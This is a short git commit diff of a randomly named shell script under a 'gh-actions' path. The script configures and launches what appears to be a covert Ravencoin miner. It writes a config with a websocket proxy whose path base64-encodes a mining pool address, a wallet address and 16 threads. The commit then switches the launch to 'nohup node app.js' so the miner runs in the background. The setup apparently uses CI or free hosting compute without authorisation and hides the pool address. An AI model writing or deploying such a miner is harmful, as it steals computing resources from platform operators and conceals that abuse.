4136f43a14792f47c3690457ba2d753442117ef1
arjuillahalmadadi <117597346+arjuillahalmadadi@users.noreply.github.com>
2025-09-08 11:24:53 +0700

    Update v104324rvn16c791.sh

--- gh-actions/refs/heads/main/v104324rvn16c791.sh
+++ gh-actions/refs/heads/main/v104324rvn16c791.sh
@@ -4,4 +4,4 @@ cd node-mino-app
 
 echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i", "password": "c=RVN", "argent": "js-flutter/0.1", "threads": 16}' > data.txt
 
-node app.js
+nohup node app.js
